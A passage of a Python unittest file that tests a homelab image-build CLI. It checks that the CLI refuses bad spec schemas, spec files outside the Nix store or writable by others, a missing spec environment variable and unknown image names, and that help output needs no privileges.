        bad_schema = self.document()
        bad_schema["schema"] = 2
        with self.assertRaises(image_build.BuildError):
            cli.parse_spec(bad_schema)

    def test_spec_outside_the_nix_store_is_refused(self):
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "spec.json"
            path.write_text(json.dumps(self.document()))
            with patch.dict(os.environ, {"HOMELAB_BUILD_SPEC": str(path)}):
                with self.assertRaisesRegex(image_build.BuildError, "Nix store"):
                    cli.load_spec()
            with (
                patch.dict(os.environ, {"HOMELAB_BUILD_SPEC": str(path)}),
                patch.object(cli, "SPEC_PREFIXES", (str(Path(directory).resolve()) + "/",)),
            ):
                self.assertIn("example", cli.load_spec().images)
                path.chmod(0o666)
                with self.assertRaisesRegex(image_build.BuildError, "non-writable"):
                    cli.load_spec()

    def test_missing_spec_variable_is_refused(self):
        with patch.dict(os.environ, {}, clear=False) as environment:
            environment.pop("HOMELAB_BUILD_SPEC", None)
            with self.assertRaisesRegex(image_build.BuildError, "HOMELAB_BUILD_SPEC"):
                cli.load_spec()

    def test_unknown_image_name_is_refused_by_the_cli(self):
        with tempfile.TemporaryDirectory() as directory:
            parsed = cli.parse_spec(self.document())
            err = io.StringIO()
            with (
                patch.object(cli, "load_spec", return_value=parsed),
                patch.object(cli, "require_admin"),
                patch.object(cli.os, "getuid", return_value=0),
                patch.object(cli.os, "chdir"),
                patch.object(cli.os, "umask"),
                patch.object(sys, "stderr", err),
            ):
                self.assertEqual(cli.main(["deploy", "missing"]), 1)
            self.assertIn("unknown image 'missing'", err.getvalue())
            self.assertFalse(Path(directory, "missing").exists())

    def test_help_does_not_need_privileges(self):
        with patch.object(sys, "stdout", io.StringIO()):
            with self.assertRaises(SystemExit) as exit_code:
                cli.main(["--help"])
        self.assertEqual(exit_code.exception.code, 0)


if __name__ == "__main__":
    unittest.main()
